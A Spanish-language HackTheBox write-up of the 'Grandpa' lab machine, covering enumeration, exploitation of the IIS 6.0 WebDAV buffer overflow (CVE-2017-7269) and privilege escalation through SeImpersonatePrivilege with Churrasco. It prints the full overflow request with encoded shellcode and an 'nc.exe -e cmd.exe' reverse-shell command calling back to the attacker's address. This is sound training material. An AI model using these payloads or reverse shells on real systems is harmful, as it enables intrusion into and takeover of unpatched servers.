---
date: 2023-08-03 12:00:00
layout: post
title: Grandpa Writeup
subtitle: Writeup de la máquina Grandpa de la plataforma HackTheBox
description: En esta máquina nos aprovechamos de una versión anticuada del IIS la cual permite realizar un Buffer Overflow con la finalidad de conseguir un RCE. Una vez ejecutado este podemos ingresar dentro de la máquina en la cual escalamos privilegios explotando el privilegió SeImpersonatePrivilege.
image: /assets/img/machines/Grandpa/Grandpa.png
optimized_image: /assets/img/machines/Grandpa/Grandpa.png
category: Writeup
tags:
  - HackTheBox
  - Writeup
  - Windows
  - Easy
  - CVE
  - Buffer Overflow
  - SeImpersonatePrivilege
author: FredBrave
---
# Enumeración
Empezamos con dos escaneos a la máquina uno para encontrar los puertos abiertos y otro hacia los puertos abiertos para encontrar las versiones y servicios que corren en los puertos.

```bash
❯ sudo nmap -p- --open -sS --min-rate 2000 -n -Pn 10.129.144.67 -oG Targeted
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-03 11:01 EDT
Nmap scan report for 10.129.144.67
Host is up (0.11s latency).
Not shown: 65534 filtered tcp ports (no-response)
Some closed ports may be reported as filtered due to --defeat-rst-ratelimit
PORT   STATE SERVICE
80/tcp open  http

Nmap done: 1 IP address (1 host up) scanned in 65.88 seconds
❯ sudo nmap -p80 -sCV 10.129.144.67 -oN Target
Starting Nmap 7.94 ( https://nmap.org ) at 2023-08-03 11:03 EDT
Nmap scan report for 10.129.144.67
Host is up (0.11s latency).

PORT   STATE SERVICE VERSION
80/tcp open  http    Microsoft IIS httpd 6.0
|_http-server-header: Microsoft-IIS/6.0
| http-methods: 
|_  Potentially risky methods: TRACE COPY PROPFIND SEARCH LOCK UNLOCK DELETE PUT MOVE MKCOL PROPPATCH
| http-webdav-scan: 
|   Server Type: Microsoft-IIS/6.0
|   WebDAV type: Unknown
|   Allowed Methods: OPTIONS, TRACE, GET, HEAD, COPY, PROPFIND, SEARCH, LOCK, UNLOCK
|   Public Options: OPTIONS, TRACE, GET, HEAD, DELETE, PUT, POST, COPY, MOVE, MKCOL, PROPFIND, PROPPATCH, LOCK, UNLOCK, SEARCH
|_  Server Date: Thu, 03 Aug 2023 15:03:17 GMT
|_http-title: Under Construction
Service Info: OS: Windows; CPE: cpe:/o:microsoft:windows

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.15 seconds
```
# Puerto 80

Comienzo a enumerar el puerto 80, pero no encuentro nada interesante en este. Trate de aprovechar el método `PUT` para intentar subir archivos pero no funciono.

```bash
❯ davtest -url http://grandpa.htb
********************************************************
 Testing DAV connection
OPEN            SUCCEED:                http://grandpa.htb
********************************************************
NOTE    Random string for this session: Ii2T8OzL6nOk2xh
********************************************************
 Creating directory
MKCOL           FAIL
********************************************************
 Sending test files
PUT     html    FAIL
PUT     php     FAIL
PUT     jhtml   FAIL
PUT     shtml   FAIL
PUT     pl      FAIL
PUT     jsp     FAIL
PUT     txt     FAIL
PUT     asp     FAIL
PUT     cfm     FAIL
PUT     aspx    FAIL
PUT     cgi     FAIL

********************************************************
/usr/bin/davtest Summary:
```
# Shell como Network Service

Por lo tanto proseguí a buscar vulnerabilidades para la versión del IIS, ya que vi que estaba bastante desactualizado.

```bash
❯ searchsploit IIS 6.0
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                                                                                                           |  Path
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Microsoft IIS 4.0/5.0/6.0 - Internal IP Address/Internal Network Name Disclosure                                                                                                                         | windows/remote/21057.txt
Microsoft IIS 5.0/6.0 FTP Server (Windows 2000) - Remote Stack Overflow                                                                                                                                  | windows/remote/9541.pl
Microsoft IIS 5.0/6.0 FTP Server - Stack Exhaustion Denial of Service                                                                                                                                    | windows/dos/9587.txt
Microsoft IIS 6.0 - '/AUX / '.aspx' Remote Denial of Service                                                                                                                                             | windows/dos/3965.pl
Microsoft IIS 6.0 - ASP Stack Overflow Stack Exhaustion (Denial of Service) (MS10-065)                                                                                                                   | windows/dos/15167.txt
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                                                                 | windows/remote/41738.py
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass                                                                                                                                                  | windows/remote/8765.php
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (1)                                                                                                                                              | windows/remote/8704.txt
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (2)                                                                                                                                              | windows/remote/8806.pl
Microsoft IIS 6.0 - WebDAV Remote Authentication Bypass (Patch)                                                                                                                                          | windows/remote/8754.patch
Microsoft IIS 6.0/7.5 (+ PHP) - Multiple Vulnerabilities                                                                                                                                                 | windows/remote/19033.txt
--------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results
```
De todos los exploits el más interesante es el siguiente:

```bash
Microsoft IIS 6.0 - WebDAV 'ScStoragePathFromUrl' Remote Buffer Overflow                                                                                                                                 | windows/remote/41738.py
```
Este exploit realiza un Buffer Overflow que me permite realizar un RCE en la máquina víctima.

Este exploit necesitaba que yo creara un shellcode usando msfvenom, pero después de intentarlo un par de veces no funcionaba. Por lo cual tuve que buscar más exploits de esta vulnerabilidad en específico en internet. De entre los que encontré el <a href="https://github.com/g0rx/iis6-exploit-2017-CVE-2017-7269">siguiente</a> fue el mejor en mi opinión.

Este no solo funcionaba bien, sino que también me automatizaba el shellcode para que solo tuviera que ingresar mis datos en forma de parámetros para la llegada de una shell. El exploit se usa de la siguiente manera:

```bash
❯ python2 exploit.py 10.129.144.67 80 10.10.16.31 443
PROPFIND / HTTP/1.1
Host: localhost
Content-Length: 1744
If: <http://localhost/aaaaaaa潨硣睡焳椶䝲稹䭷佰畓穏䡨噣浔桅㥓偬啧杣㍤䘰硅楒吱䱘橑牁䈱瀵塐㙤汇㔹呪倴呃睒偡㈲测水㉇扁㝍兡塢䝳剐㙰畄桪㍴乊硫䥶乳䱪坺潱塊㈰㝮䭉前䡣潌畖畵景癨䑍偰稶手敗畐橲穫睢癘扈攱ご汹偊呢倳㕷橷䅄㌴摶䵆噔䝬敃瘲牸坩䌸扲娰夸呈ȂȂዀ栃汄剖䬷汭佘塚祐䥪塏䩒䅐晍Ꮐ栃䠴攱潃湦瑁䍬Ꮐ栃千橁灒㌰塦䉌灋捆关祁穐䩬> (Not <locktoken:write1>) <http://localhost/bbbbbbb祈慵佃潧歯䡅㙆杵䐳㡱坥婢吵噡楒橓兗㡎奈捕䥱䍤摲㑨䝘煹㍫歕浈偏穆㑱潔瑃奖潯獁㑗慨穲㝅䵉坎呈䰸㙺㕲扦湃䡭㕈慷䵚慴䄳䍥割浩㙱乤渹捓此兆估硯牓材䕓穣焹体䑖漶獹桷穖慊㥅㘹氹䔱㑲卥塊䑎穄氵婖扁湲昱奙吳ㅂ塥奁煐〶坷䑗卡Ꮐ栃湏栀湏栀䉇癪Ꮐ栃䉗佴奇刴䭦䭂瑤硯悂栁儵牺瑺䵇䑙块넓栀ㅶ湯ⓣ栁ᑠ栃翾￿￿Ꮐ栃Ѯ栃煮瑰ᐴ栃⧧栁鎑栀㤱普䥕げ呫癫牊祡ᐜ栃清栀眲票䵩㙬䑨䵰艆栀䡷㉓ᶪ栂潪䌵ᏸ栃⧧栁VVYA4444444444QATAXAZAPA3QADAZABARALAYAIAQAIAQAPA5AAAPAZ1AI1AIAIAJ11AIAIAXA58AAPAZABABQI1AIQIAIQI1111AIAJQI1AYAZBABABABAB30APB944JBRDDKLMN8KPM0KP4KOYM4CQJINDKSKPKPTKKQTKT0D8TKQ8RTJKKX1OTKIGJSW4R0KOIBJHKCKOKOKOF0V04PF0M0A>
```
```bash
❯ rlwrap nc -nlvp 443
listening on [any] 443 ...
connect to [10.10.16.31] from (UNKNOWN) [10.129.144.67] 1033
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

c:\windows\system32\inetsrv>whoami
whoami
nt authority\network service
```
# Shell como authority\system

Enumerando encuentro que la version del sistema es bastante vieja.
```bash
c:\windows\system32\inetsrv>systeminfo
systeminfo

Host Name:                 GRANPA
OS Name:                   Microsoft(R) Windows(R) Server 2003, Standard Edition
OS Version:                5.2.3790 Service Pack 2 Build 3790
OS Manufacturer:           Microsoft Corporation
OS Configuration:          Standalone Server
OS Build Type:             Uniprocessor Free
Registered Owner:          HTB
Registered Organization:   HTB
Product ID:                69712-296-0024942-44782
Original Install Date:     4/12/2017, 5:07:40 PM
System Up Time:            0 Days, 1 Hours, 6 Minutes, 25 Seconds
System Manufacturer:       VMware, Inc.
System Model:              VMware Virtual Platform
System Type:               X86-based PC
Processor(s):              1 Processor(s) Installed.
                           [01]: x86 Family 25 Model 1 Stepping 1 AuthenticAMD ~2445 Mhz
BIOS Version:              INTEL  - 6040000
Windows Directory:         C:\WINDOWS
System Directory:          C:\WINDOWS\system32
Boot Device:               \Device\HarddiskVolume1
System Locale:             en-us;English (United States)
Input Locale:              en-us;English (United States)
Time Zone:                 (GMT+02:00) Athens, Beirut, Istanbul, Minsk
Total Physical Memory:     1,023 MB
Available Physical Memory: 764 MB
Page File: Max Size:       2,470 MB
Page File: Available:      2,305 MB
Page File: In Use:         165 MB
Page File Location(s):     C:\pagefile.sys
Domain:                    HTB
Logon Server:              N/A
Hotfix(s):                 1 Hotfix(s) Installed.
                           [01]: Q147222
Network Card(s):           N/A
```
Ademas de que tengo el privilegio `SeImpersonatePrivilege`.

```bash
c:\windows\system32\inetsrv>whoami /priv
whoami /priv

PRIVILEGES INFORMATION
----------------------

Privilege Name                Description                               State   
============================= ========================================= ========
SeAuditPrivilege              Generate security audits                  Disabled
SeIncreaseQuotaPrivilege      Adjust memory quotas for a process        Disabled
SeAssignPrimaryTokenPrivilege Replace a process level token             Disabled
SeChangeNotifyPrivilege       Bypass traverse checking                  Enabled 
SeImpersonatePrivilege        Impersonate a client after authentication Enabled 
SeCreateGlobalPrivilege       Create global objects                     Enabled
```
Se me ocurrió usar el `JuicyPotato`, pero para versiones tan viejas sería mejor utilizar el script <a href=" https://github.com/Re4son/Churrasco">Churrasco</a>. Descargo el .exe y lo comparto con smbserver.

```bash
❯ ls
 churrasco.exe   exploit.py
❯ locate nc.exe
/home/kali/Machines/HackTheBox/Minion/Content/nc.exe
/home/kali/Utilidades/SecLists/Web-Shells/FuzzDB/nc.exe
/usr/share/windows-resources/binaries/nc.exe
❯ cp /home/kali/Machines/HackTheBox/Minion/Content/nc.exe .
❯ impacket-smbserver smbFolder $(pwd) -smb2support
Impacket v0.10.0 - Copyright 2022 SecureAuth Corporation

[*] Config file parsed
[*] Callback added for UUID 4B324FC8-1670-01D3-1278-5A47BF6EE188 V:3.0
[*] Callback added for UUID 6BFFD098-A112-3610-9833-46C3F87E345A V:1.0
[*] Config file parsed
[*] Config file parsed
[*] Config file parsed
```
Lo copio en la máquina víctima y lo ejecuto usando el nc.exe para que me mande una shell.

```bash
C:\wmpub>copy \\10.10.16.31\smbFolder\churrasco.exe .
copy \\10.10.16.31\smbFolder\churrasco.exe .
The network path was not found.

C:\wmpub>copy \\10.10.16.31\smbFolder\churrasco.exe .
copy \\10.10.16.31\smbFolder\churrasco.exe .
        1 file(s) copied.

C:\wmpub>copy \\10.10.16.31\smbFolder\nc.exe .
copy \\10.10.16.31\smbFolder\nc.exe .
        1 file(s) copied.

C:\wmpub>.\churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.16.31 5555"
.\churrasco.exe -d "C:\wmpub\nc.exe -e cmd.exe 10.10.16.31 5555"
```


```bash
rlwrap nc -lnvp 5555
Ncat: Version 7.80 ( https://nmap.org/ncat )
Ncat: Listening on :::5555
Ncat: Listening on 0.0.0.0:5555
Ncat: Connection from 10.129.144.130.
Ncat: Connection from 10.129.144.130:3040.
Microsoft Windows [Version 5.2.3790]
(C) Copyright 1985-2003 Microsoft Corp.

C:\WINDOWS\TEMP>whoami
whoami
nt authority\system
```
Hemos pwneado la maquina!

